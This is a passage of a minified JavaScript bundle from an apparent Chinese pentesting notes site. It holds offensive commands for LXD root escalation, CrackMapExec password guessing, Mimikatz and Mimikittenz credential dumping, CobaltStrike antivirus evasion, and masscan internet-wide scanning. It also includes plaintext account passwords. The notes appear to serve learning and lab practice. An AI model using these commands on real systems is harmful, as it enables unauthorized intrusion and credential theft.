
                          \u4E0B\u8F7D\u3010lxd.tar.xz\u3011\u548C\u3010rootlet.squashfs\u3011\uFF0C\u4E24\u4E2A\u6587\u4EF6
                              \u53EF\u4EE5\u7528\u3010wget\u3011\u3002

                          \u52A0\u8F7D\u955C\u50CF
                              lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

                          \u68C0\u67E5\u955C\u50CF\uFF0C\u662F\u5426\u52A0\u8F7D\u6210\u529F
                              lxc image list

                          \u505A\u4E00\u4E9B\u68C0\u67E5
                              \u6211\u4EEC\u73B0\u5728\u5FC5\u987B\u5C06\u3010security.privileged\u3011\u6807\u5FD7\u8BBE\u7F6E\u4E3A\u3010true\u3011\uFF0C\u4EE5\u4FBF\u5BB9\u5668\u62E5\u6709 root\u6587\u4EF6\u7CFB\u7EDF \u62E5\u6709\u7684\u6240\u6709\u6743\u9650\u3002
                                  lxc init alpine privesc -c security.privileged=true

                              \u6211\u4EEC\u8FD8\u5C06\u5728 /mnt \u6587\u4EF6\u5939\u4E2D\u7684\u5BB9\u5668\u4E0A\u6302\u8F7D root\u6587\u4EF6\u7CFB\u7EDF \u3002
                                  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

                          \u542F\u52A8\u3010\u5BB9\u5668\u3011\uFF0C\u542F\u52A8\u3010root shell\u3011
                              lxc start privesc
                              lxc exec privesc /bin/sh


              \u3010lxd\u3011\u4ECB\u7ECD\uFF1A
                  \u4E0B\u4E00\u4EE3\u7CFB\u7EDF\u5BB9\u5668\u548C\u865A\u62DF\u673A\u7BA1\u7406\u5668\u3002
                  \u7C7B\u4F3C\u4E8E\u300ADocker\u300B\u3002

                `)))})},{name:"\u3010Windows\u63D0\u6743\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5148\u8FDB\u884C\u63A2\u6D4B\uFF1A
              whoami  /priv

                  \u5E38\u89C1\u6743\u9650\uFF1A

                      \u3010SeChangeNotifyPrivilege\u3011
                      \u3010SeIncreaseWorkingSetPrivilege\u3011

          \u5BFB\u627E\u4E0D\u5E38\u89C1\u7684\u76EE\u5F55\u6587\u4EF6          \uFF08uncommon\uFF09


          \u76F8\u5173\u5DE5\u5177\uFF1A
              `.concat(m.\u5E38\u7528,`

          `)))},{name:"\u3010\u6A2A\u5411\u79FB\u52A8\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`



          `))},{name:"\u3010\u5185\u7F51\u6E17\u900F\u3011",desc:j.a.createElement(j.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(F.\u5171\u540C\u53C2\u8003\u8D44\u6599,`

                \u8BF8\u591A\u5728\u7EBF\u53C2\u8003\u8D44\u6599\uFF1A
                        \u9AD8\u4EF7\u503C\uFF1A
                            \u300A\u8BB0\u5F55\u81EA\u5DF1\u5728\u5185\u7F51\u6E17\u900F\u5B66\u4E60\u4E2D\u7684\u4E00\u4E9B\u5FC3\u5F97\u548C\u6280\u5DE7\uFF0C\u4E0D\u5B9A\u671F\u8BB0\u5F55\u4E2D:)\u300B  https://github.com/M1k0er/pentest-notes

                `))},{name:"\u3010\u5185\u7F51\u4FE1\u606F\u6536\u96C6\u3011",desc:j.a.createElement(j.a.Fragment,null),steps:[{name:"\u3010\u81EA\u52A8\u679A\u4E3E\u5DE5\u5177\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("",m.\u5E38\u7528,""))}]},{name:"\u3010CobaltStrike\u3011\u3001\u3010CS\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u57FA\u672C\u4ECB\u7ECD\uFF1A
              cobaltstrike\u3001cobalt strike\u3001cs

                  https://t.zsxq.com/RZjmem6

                  \u9B54\u6539CobaltStrike\uFF1A\u547D\u7531\u5DF1\u9020\uFF08\u4E0A\uFF09
                      https://t.zsxq.com/MvzvBmy
                      https://bbs.pediy.com/thread-267848.htm

                  CS4.4\u7ED5\u8FC7vultr\u7279\u5F81\u68C0\u6D4B\u4FEE\u6539checksum8\u7B97\u6CD5\uFF0C\u8D85\u8BE6\u7EC6\u8FC7\u7A0B\u5C0F\u767D\u7406\u89E3
                      https://t.zsxq.com/3FYzNBa
                      https://www.wangan.com/p/7fy74727d2f60d4f


          execute-assembly
              \u5728CobaltStrike\u4E2D\u6709\u4E00\u4E2A\u540D\u4E3A\u201Dexecute-assembly\u201D\u7684\u547D\u4EE4\uFF0C\u80FD\u591F\u4ECE\u5185\u5B58\u4E2D\u52A0\u8F7D.NET\u7A0B\u5E8F\u96C6\u3002
                  \u8FD9\u4E2A\u529F\u80FD\u4E0D\u9700\u8981\u5411\u786C\u76D8\u5199\u5165\u6587\u4EF6\uFF0C\u5341\u5206\u9690\u853D\uFF0C\u53EF\u4EE5\u7528\u6765\u8EB2\u907F\u6740\u8F6F\u3002


          `))},t.a]},{name:"\u3010\u540E\u6E17\u900F\u3011\u3001\u3010PostExploitation\u3011",desc:j.a.createElement(j.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(F.\u5171\u540C\u53C2\u8003\u8D44\u6599,""))},{name:"\u3010CrackMapExec\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


              CrackMapExec / CME\uFF0C\u57FA\u672C\u4F7F\u7528
                  crackmapexec  smb  10.10.10.149  -u  users  -p  passwords
                      \u5982\u679C\u767B\u5F55\u5931\u8D25
                          1.\u8BF4\u660E \u3010\u7528\u6237\u3011 \u4E0D\u662F\u3010Remote Management Users \u7EC4\u3011\u3002

                  \u5E38\u7528\u9009\u9879\uFF1A
                      \u3010--continue-on-success\u3011\u9009\u9879
                          123

                      \u3010--rid-brute\u3011\u9009\u9879
                          \u4E3A\u6709\u6548\u7684\u3010SID\u3011\uFF0C\u8FD4\u56DE\u3010\u7528\u6237\u540D\u3011\u3002


                  CrackMapExec                    (\u540E\u5229\u7528\u5DE5\u5177)
                      crackmapexec  -u  <\u7528\u6237\u540D\u8BCD\u5178\u6587\u4EF6>  -p  <\u5BC6\u7801\u8BCD\u5178\u6587\u4EF6>  --shares  <IP\u5730\u5740>
                          \u6709\u4E00\u4E2A\u7279\u70B9\uFF0C\u9047\u5230\u300A\u6709\u6548\u7684\u7528\u6237\u540D\u5BC6\u7801\u7EC4\u5408\u300B\uFF0C\u4F1A\u7ACB\u5373\u505C\u6B62\u3002
                          \u4F7F\u7528\u66F4\u65B0\u7684\u5217\u8868\u518D\u6B21\u8FD0\u884C\u8BE5\u547D\u4EE4\u3002


              `))},{name:"\u3010PowerSploit\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


              PowerSploit
                  Out-Minidump / Out-Minidump.ps1

                  Select-String
                      Select-String  -Path  <\u76EE\u6807\u8DEF\u5F84>  -Pattern  <\u67E5\u627E\u901A\u914D\u7B26>
                          \u3010-Pattern\u3011\uFF0C\u662F\uFF1F\uFF1F


              `))},{name:"\u3010Mimikittenz\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              Mimikittenz

                  \u4ECB\u7ECD\uFF1A
                      \u4EE5\u4FBF\u4ECE\u5404\u79CD\u3010\u76EE\u6807\u8FDB\u7A0B\u3011\u4E2D\uFF0C\u63D0\u53D6\u7EAF\u6587\u672C\u5BC6\u7801\u3002
                      \u5229\u7528 Windows \u51FD\u6570 ReadProcessMemory() \u7684\u540E\u5229\u7528 powershell \u5DE5\u5177\u3002

                  Invoke-mimikittenz.ps1

                  \u4E00\u4E9B\u8BE6\u7EC6\u4F7F\u7528\u65B9\u5F0F\uFF1A
                      FireFox\u3001Chrome\u3001IE  \u7B49\u7B49

              `))},{name:"\u3010MimiKatz\u3011 / \u3010MimiKatz.exe\u3011 / \u3010\u7315\u7334\u6843\u3011",desc:j.a.createElement(j.a.Fragment,null),content:j.a.createElement(j.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
                \u4F7F\u7528\u3010mimikatz.exe\u3011
                    \u53C2\u8003\u8D44\u6599\uFF1A
                        \u8D44\u65991\uFF1Ahttps://www.shuzhiduo.com/A/RnJWB8xBzq/
                        \u8D44\u65992\uFF1Ahttps://www.freebuf.com/articles/web/176796.html
                        \u8D44\u65993\uFF1Ahttps://adsecurity.org/?page_id=1821

                    \u4F7F\u7528\u8FC7\u7A0B\uFF1A

                        1.\u4E0B\u8F7D\u547D\u4EE4\u3010cd ~/Downloads && wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.7z\u3011
                            1.\u8FD9\u91CC\uFF0C\u6709\u4E00\u4E2A\u8BEF\u533A\uFF1A\u3010zip\u3011\u548C\u30107z\u3011\u7684\u4E24\u4E2A\u6587\u4EF6\uFF0C\u5185\u5BB9\u7ADF\u7136\u662F\u4E0D\u4E00\u6837\u7684\uFF01\uFF01\uFF01\u30107z\u3011\u5305\u542Bexe\u6587\u4EF6\uFF0C\u800C\u3010zip\u3011\u4E0D\u5305\u542B\u3002\u6709\u70B9\u5751\u554A\u3002

                        2.\u4E0A\u4F20\u3010mimikatz.exe\u3011

                        3.\u8FD0\u884C\u3010mimikatz.exe\u3011

                            1.\u6267\u884C\u3010sekurlsa::logonpasswords\u3011\uFF0C\u83B7\u5F97\u5BC6\u7801\u8868
                                1.\u3010User Name\u3011\uFF0C\u7CFB\u7EDF\u7528\u6237\u540D\u3002
                                2.\u5BC6\u7801\u5F62\u5F0F\uFF1A
                                    1.\u3010msv\u3011
                                    2.\u3010tspkg\u3011
                                    3.\u3010wdigest\u3011
                                    4.\u3010kerberos\u3011
                                    5.\u3010ssp\u3011
                                    6.\u3010credman\u3011

                            2.\u5176\u4E2D\u6709\u6548\u7684\uFF1A\u3010sandra/Password1234!\u3011

                        4. 123
                `))}]}]},o=k},OZM5:function(nu,U,f){"use strict";f.d(U,"b",function(){return m}),f.d(U,"a",function(){return F}),f.d(U,"j",function(){return k}),f.d(U,"g",function(){return o}),f.d(U,"h",function(){return c}),f.d(U,"f",function(){return b}),f.d(U,"c",function(){return D}),f.d(U,"d",function(){return d}),f.d(U,"i",function(){return C}),f.d(U,"e",function(){return y});var R=f("KQm4"),h=f("U8pU"),l=f("Ff2n"),j=f("q1tI"),n=f.n(j),u=f("Kwbf"),t=f("WaYH"),s=["children"];function m(_,O){if(!_)return[];var B=_.slice(),r=B.indexOf(O);return r>=0&&B.splice(r,1),B}function F(_,O){var B=(_||[]).slice();return B.indexOf(O)===-1&&B.push(O),B}function k(_){return _.split("-")}function o(_,O){return"".concat(_,"-").concat(O)}function c(_){return _&&_.type&&_.type.isTreeNode}function b(_,O){var B=[],r=O[_];function P(){var p=arguments.length>0&&arguments[0]!==void 0?arguments[0]:[];p.forEach(function(z){var N=z.key,K=z.children;B.push(N),P(K)})}return P(r.children),B}function e(_){if(_.parent){var O=k(_.pos);return Number(O[O.length-1])===_.parent.children.length-1}return!1}function v(_){var O=k(_.pos);return Number(O[O.length-1])===0}function D(_,O,B,r,P,p,z,N,K,S){var T,H=_.clientX,q=_.clientY,G=_.target.getBoundingClientRect(),ju=G.top,$=G.height,au=(S==="rtl"?-1:1)*(((P==null?void 0:P.x)||0)-H),uu=(au-12)/r,eu=N[B.props.eventKey];if(q<ju+$/2){var iu=z.findIndex(function(tn){return tn.key===eu.key}),hu=iu<=0?0:iu-1,Ru=z[hu].key;eu=N[Ru]}var un=eu.key,fn=eu,nn=eu.key,Ku=0,Bu=0;if(!K.includes(un))for(var Au=0;Au<uu&&e(eu);Au+=1)eu=eu.parent,Bu+=1;var wu=O.props.data,yu=eu.node,Gu=!0;return v(eu)&&eu.level===0&&q<ju+$/2&&p({dragNode:wu,dropNode:yu,dropPosition:-1})&&eu.key===B.props.eventKey?Ku=-1:(fn.children||[]).length&&K.includes(nn)?p({dragNode:wu,dropNode:yu,dropPosition:0})?Ku=0:Gu=!1:Bu===0?uu>-1.5?p({dragNode:wu,dropNode:yu,dropPosition:1})?Ku=1:Gu=!1:p({dragNode:wu,dropNode:yu,dropPosition:0})?Ku=0:p({dragNode:wu,dropNode:yu,dropPosition:1})?Ku=1:Gu=!1:p({dragNode:wu,dropNode:yu,dropPosition:1})?Ku=1:Gu=!1,{dropPosition:Ku,dropLevelOffset:Bu,dropTargetKey:eu.key,dropTargetPos:eu.pos,dragOverNodeKey:nn,dropContainerKey:Ku===0?null:((T=eu.parent)===null||T===void 0?void 0:T.key)||null,dropAllowed:Gu}}function d(_,O){if(!!_){var B=O.multiple;return B?_.slice():_.length?[_[0]]:_}}var A=function(O){return O};function E(_,O){if(!_)return[];var B=O||{},r=B.processProps,P=r===void 0?A:r,p=Array.isArray(_)?_:[_];return p.map(function(z){var N=z.children,K=Object(l.a)(z,s),S=E(N,O);return n.a.createElement(t.a,P(K),S)})}function C(_){if(!_)return null;var O;if(Array.isArray(_))O={checkedKeys:_,halfCheckedKeys:void 0};else if(Object(h.a)(_)==="object")O={checkedKeys:_.checked||void 0,halfCheckedKeys:_.halfChecked||void 0};else return Object(u.a)(!1,"`checkedKeys` is not an array or an object"),null;return O}function y(_,O){var B=new Set;function r(P){if(!B.has(P)){var p=O[P];if(!!p){B.add(P);var z=p.parent,N=p.node;N.disabled||z&&r(z.key)}}}return(_||[]).forEach(function(P){r(P)}),Object(R.a)(B)}},PlTX:function(nu,U,f){"use strict";f.d(U,"b",function(){return Fe});var R=f("fWQN"),h=f("qqnG"),l=f("oBTY"),j=f("q1tI"),n=f.n(j),u=f("/qoP"),t=f("vhfr"),s=f("nMEn"),m={name:"\u3010NetDiscover\u3011_\u624B\u518C",desc:n.a.createElement(n.a.Fragment,null,"\u53D1\u73B0\u8303\u56F4\u5185\u7684\u6D3B\u8DC3\u4E3B\u673A"),steps:[{name:"\u57FA\u672C\u4F7F\u7528",content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("netdiscover \uFF08\u6CA1\u6709\u5176\u5B83\u53C2\u6570\uFF09","	1.\u81EA\u52A8\u8FDB\u884C\u626B\u63CF","	2.\u529F\u80FD\u76F8\u5BF9\u8F83\u5F31","netdiscover -r <IP\u5730\u5740\u3001IP\u7F51\u6BB5>","	1.\u6307\u5B9A\u8303\u56F4\u626B\u63CF","	\u3010-r\u3011 \u6307\u5B9A\u4E00\u4E2A\u8303\u56F4","\u901F\u5EA6\uFF1A","	1.\u5C31\u3010\u53D1\u73B0\u6D3B\u8DC3\u4E3B\u673A\u3011\u7684\u901F\u5EA6\u800C\u8A00\uFF0C\u6BD4\u3010masscan\u3011\u8FD8\u8981\u5FEB\u5F88\u591A\u3002"," "))}]},F=m,k=f("ysNt"),o=k.e.singleATag_blank,c={name:"\u3010MasScan\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4F7F\u7528",content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


            \u547D\u4EE4
                masscan  <IP\u5730\u5740\u3001IP\u7F51\u6BB5>  -p<\u5F00\u59CB\u7AEF\u53E3>-<\u7ED3\u675F\u7AEF\u53E3>  -sS  -Pn  -n  --randomize-hosts
                    IP\u5730\u5740\uFF0C\u53EF\u4EE5\u7528\u5355\u4E2AIP\uFF0C\u4E5F\u53EF\u4EE5\u7528IP\u7F51\u6BB5
                    \u3010-p\u7AEF\u53E3\u3011\u53EF\u4EE5\u5355\u4E2A\u7AEF\u53E3\uFF0C\u4E5F\u53EF\u4EE5\u7AEF\u53E3\u8303\u56F4 \uFF08\u8303\u56F4\u4E2D\u95F4\u7528 -\u6A2A\u6760 \u8FDE\u63A5\uFF09
                    \u5176\u5B83\u9009\u9879\uFF0C\u548C nmap \u57FA\u672C\u5DEE\u4E0D\u591A
            `,n.a.createElement(n.a.Fragment,null,"\u6D4B\u901F\uFF1A \uFF08",o("\u94FE\u63A5","https://zhuanlan.zhihu.com/p/323726126"),"\uFF09"),`
                1.\u4E00\u822C\u80FD\u8FBE\u5230\u7684\u6781\u901F\uFF1A
                    \u30101-kpps\u3011\uFF0C\u6307\u3010\u6BCF\u79D21000\u4E2A\u7AEF\u53E3\u3011\u3002
                    \u5C40\u57DF\u7F51\uFF1A93-kpps\u5DE6\u53F3\u3002
                2.\u3010\u5047\u8DEF\u7531mac\u5730\u5740\u3011\uFF0C\u4EE5\u672C\u5730\u6D4B\u901F
                    masscan 0.0.0.0/4 -p80 --rate 100000000 --router-mac 66-55-44-33-22-11
                3.\u3010offline\u6A21\u5F0F\u3011\uFF0C\u6D4B\u901F
                    masscan 0.0.0.0/4 -p80 --rate 100000000 --offline

            \u52A0\u901F\uFF1A
                \u3010--rate <\u6570\u5B57>\u3011 \u8BBE\u7F6E\u901F\u7387
                \u3010--max-rate <\u6570\u5B57>\u3011 \u6700\u5927\u901F\u7387\uFF1F\uFF1F\uFF1F

            \u626B\u63CF\u6574\u4E2A\u4E92\u8054\u7F51\uFF1A
                masscan 0.0.0.0/0 -p0-65535

            \u6210\u529F\u4F8B\u5B50\uFF1A
                IP\u7F51\u6BB5\u3010192.168.81.1/30\u3011 + \u7AEF\u53E3\u301012000-20500\u3011\uFF0C\u5171\u67094\u4E2A\u7ED3\u679C

            `,n.a.createElement(n.a.Fragment,null,"\u5176\u5B83\u5E38\u7528\u9009\u9879\uFF1A \uFF08",o("\u53EF\u67E5\u8BE2\u8D44\u65991","http://manpages.ubuntu.com/manpages/bionic/man8/masscan.8.html"),"\uFF09"),`
                \u3010-e  <\u7F51\u7EDC\u63A5\u53E3\u540D>\u3011\uFF0C\u641C\u7D22\u7279\u5B9A\u7F51\u7EDC\u7AEF\u53E3
                    \u6307\u5B9A\u7F51\u7EDC\u8BBE\u5907\uFF0C\u6BD4\u5982\u4E00\u4E2A\u7F51\u5361 tun0 \u3002
            `))}]},b=c,e={name:"\u3010Nikto\u3011_\u624B\u518C",steps:[{name:"\u5DF2\u7ECF\u8FC7\u65F6",content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("nikto -o <\u8F93\u51FA\u6587\u4EF6> -h <IP\u5730\u5740> -p 80 ","	\u662F\u6BD4\u8F83\u843D\u540E\u7684\u626B\u63CF\u5668\uFF0C\u7ED3\u679C\u4E5F\u4E0D\u591F\u7CBE\u786E"))}]},v=e,D=k.e.singleATag_blank,d={name:"\u3010Nessus\u3011_\u624B\u518C",steps:[{name:"\u5927\u81F4",content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("systemctl","	systemctl start nessusd","		\u7528\u4E8E\u542F\u52A8\u670D\u52A1",'	firefox  -new-tab  "https://localhost:8834"  ',"		\u6253\u5F00\u63A7\u5236\u53F0\u7F51\u9875",n.a.createElement(n.a.Fragment,null,"\u51ED\u8BC1\u83B7\u53D6\uFF1A\uFF08",D("\u6D41\u7A0B\u7684\u4E00\u4E9B\u7B80\u4ECB","https://my.oschina.net/u/4518087/blog/4727400"),"\u3001",D("\u7EDF\u4E00\u6CE8\u518C\u9875\u9762","https://www.tenable.com/products/nessus/activation-code#nessus"),"\u3001",D("\u5907\u7528\u4E13\u4E1A\u7248\u6CE8\u518C\u9875\u9762","https://zh-cn.tenable.com/products/nessus/nessus-professional/evaluate"),"\uFF09"),"	\u57FA\u7840\u7248","		\u7528\u3010outlook\u90AE\u7BB1\u3011\u6CE8\u518C\u8D26\u53F7","	","	\u4E13\u4E1A\u7248","		\u7528\u3010foxmail\u90AE\u7BB1\u3011\u6CE8\u518C\u8D26\u53F7\uFF0C\u5927\u698210\u5206\u949F\u5DE6\u53F3\uFF0C\u4F1A\u6536\u5230",n.a.createElement(n.a.Fragment,null,"	","\u5E8F\u5217\u53F7\u4F7F\u7528\uFF1A",D("\u6307\u4EE4\u8BF4\u660E","https://docs.tenable.com/nessus/Content/UpdateActivationCode.htm")),"		\u6267\u884C\u3010/opt/nessus/sbin/nessuscli fetch --register <\u5E8F\u5217\u53F7xxxx-xxxx-xxxx-xxxx>\u3011","			\u7136\u540E\uFF0C\u4F1A\u81EA\u52A8\u66F4\u65B0\u3010\u4E13\u4E1A\u7248\u63D2\u4EF6\u3011\u548C\u3010\u4E13\u4E1A\u7248\u7EC4\u4EF6\u3011","		\u672C\u5730\u6CE8\u518C\u8D26\u53F7\uFF08\u597D\u50CFlicense\u8D26\u53F7\u4E0A\u9650\u6709\u9650\u5236\uFF09",n.a.createElement(n.a.Fragment,null,"\u672C\u5730\u8D26\u53F7\u7BA1\u7406\uFF1A\uFF08",D("\u4E00\u4E9B\u64CD\u4F5C","https://www.jianshu.com/p/f55e0f62257a"),"\u3001",D("\u4E00\u4E9B\u6307\u4EE4","https://docs.tenable.com/nessus/Content/NessusCLI.htm"),"\uFF09"),"	\u8D26\u53F7\uFF1A\u3010hanshou101\u3011+\u3010123456\u3011","	\u8FDB\u5165\u6839\u76EE\u5F55 cd /opt/nessus/sbin","	./nessuscli \uFF08\u57FA\u672C\u521D\u59CB\u5316\uFF09","	./nessuscli lsuser \uFF08\u5217\u51FA\u73B0\u6709\u7528\u6237\uFF09","	./nessuscli adduser \uFF08\u65B0\u589E\u7528\u6237\uFF09","	./nessuscli rmuser \uFF08\u5220\u9664\u7528\u6237\uFF09","	./nessuscli chpasswd <\u7528\u6237\u540D> \uFF08\u4FEE\u6539\u7528\u6237\u5BC6\u7801\uFF09","\u57FA\u672C\u64CD\u4F5C\uFF1A","	1.\u7B2C\u4E00\u6B21\u8FDB\u6765\uFF0C\u6DFB\u52A0\u57FA\u672C\u3010IP\u3001\u57DF\u540D\u3011","	2.\u3010My Host Discovery Scan\u3011\u6839\u636E \u4E3B\u673A\u57FA\u672C\u53D1\u73B0\u63A2\u7D22\u7ED3\u679C\uFF0C\u52FE\u9009\u8FDB\u884C\u626B\u63CF","	3.\u3010My Basic Network Scan\u3011\uFF0C\u81EA\u52A8\u8FDB\u5165\u626B\u63CF"))}]},A=d,E=f("tJVT"),C,y,_=k.e.singleATag_blank,O=k.e.tutorial.descLinks,B={name:"\u3010Ping\u7C7B\u3011_\u3010IPv6\u3011_\u624B\u518C",steps:[{name:"\u3010ping\u3011\u3001\u3010\u7C7Bping\u3011",steps:[{name:"\u3010ping\u3011",desc:n.a.createElement(n.a.Fragment,null,"\uFF08Windows\u3001Linux\u901A\u7528\uFF0C\u529F\u80FD\u76F8\u5BF9\u8F83\u5F31\uFF09"),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("ping \uFF08Windows\u3001Linux\u901A\u7528\uFF0C\u529F\u80FD\u76F8\u5BF9\u8F83\u5F31\uFF09","	ping <\u57DF\u540D\u3001IP>"," "))},{name:"\u3010hping3\u3011 \uFF08\u529F\u80FD\u66F4\u5F3A\u7248\u7684ping\uFF09",desc:n.a.createElement(n.a.Fragment,null,"hping3 \uFF08\u529F\u80FD\u66F4\u5F3A\u7248\u7684ping\uFF09"),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("hping3 \uFF08\u529F\u80FD\u66F4\u5F3A\u7248\u7684ping\uFF09","	hping3 -p 80 -c 30 -S  <\u57DF\u540D\u3001IP>","		\u3010-S\u3011\uFF0C\u4F7F\u7528\u3010SYN\u6807\u8BC6\u96C6\u3011\u4EE5\u53D1\u9001 \u7C7Bping\u547D\u4EE4","		\u3010-p\u3011\uFF0C\u53D1\u9001\u523080\u7AEF\u53E3 \uFF0880\u7AEF\u53E3\u7684\u5408\u6CD5\u8BF7\u6C42\uFF0C\u5F88\u5C11\u88AB\u670D\u52A1\u5668\u963B\u585E\uFF09","		\u3010-c\u3011\u53D1\u5305\u6B21\u6570"))},{name:"nmap\u7684\u3010-sn\u3011\u9009\u9879",desc:n.a.createElement(n.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"nMEn"))]).then(function(sn){var mn=Object(E.a)(sn,1),Cn=mn[0];return n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(u.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(Cn.Nmap_\u624B\u518C)))})}]},{name:"\u3010IPv6\u3011",steps:[{name:"\u3010atk6-alive6\u3011",desc:n.a.createElement(n.a.Fragment,null,"\uFF08\u83B7\u53D6\u672C\u673A \u540C\u4E00\u6BB5\u4E2D\u7684\u6D3B\u8DC3\u5730\u5740\uFF0C\u597D\u50CF\u65E0\u6CD5\u67E5\u627E\u8FDC\u7A0B\uFF09"),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("atk6-alive6 \uFF08\u83B7\u53D6\u672C\u673A \u540C\u4E00\u6BB5\u4E2D\u7684\u6D3B\u8DC3\u5730\u5740\uFF0C\u597D\u50CF\u65E0\u6CD5\u67E5\u627E\u8FDC\u7A0B\uFF09","	atk6-alive6 <\u8BBE\u5907\u540D\uFF0C\u5982eth0\u3001lo>"))},{name:"\u4F7F\u7528 \u3010metasploit\u3011 / \u3010msf\u3011 \u53D1\u73B0IPv6\u7684\u8BA1\u7B97\u673A",desc:n.a.createElement(n.a.Fragment,null),content:Promise.resolve().then(f.bind(null,"eFOt")).then(function(sn){return n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(u.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(sn.ExploitDB_SearchSploit_MetaSploit_MSF_\u624B\u518C)))})}]},{name:"\u300A\u5728\u7EBF\u7F51\u7AD9\u300B\u2014\u2014\u3010\u771F\u5B9EIP\u3011\u67E5\u8BE2\u3001\u3010\u6D4B\u901F\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,(C=u.g.\u7EC4\u4EF6\u624B\u518C).\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E.apply(C,Object(l.a)(O([{href:"https://www.17ce.com/",name:"\u56FD\u5185\u5168\u56FD\u6D4B\u901F 17CE.COM | \u652F\u6301GET\u3001Ping\u3001DNS\u3001CDN\u3001\u8DEF\u7531\u8FFD\u8E2A",rate:"\u4E2D\u4EF7\u503C\uFF0C\u56FD\u5185\u5404\u8282\u70B9\u6D4B\u901F\uFF0C\u652F\u6301\u8DF3\u8F6C\u8FFD\u8E2A"},{href:"http://dns.bugscaner.com/",name:"\u540CIP\u7F51\u7AD9\u67E5\u8BE2 - IP\u53CD\u67E5\u57DF\u540D - CMS\u7C7B\u578B\u63A2\u6D4B",rate:"\u4E2D\u4EF7\u503C\uFF0C\u80FD\u591F\u67E5\u5230\u3002\u4F46\u4FE1\u606F\u6BD4\u8F83\u7B80\u7565"},{href:"https://asm.ca.com/en/ping.php",name:"\u56FD\u5916\u5168\u7403\u8282\u70B9\uFF0C\u6D4B\u901F\u7F51\u7AD9 \u2014\u2014 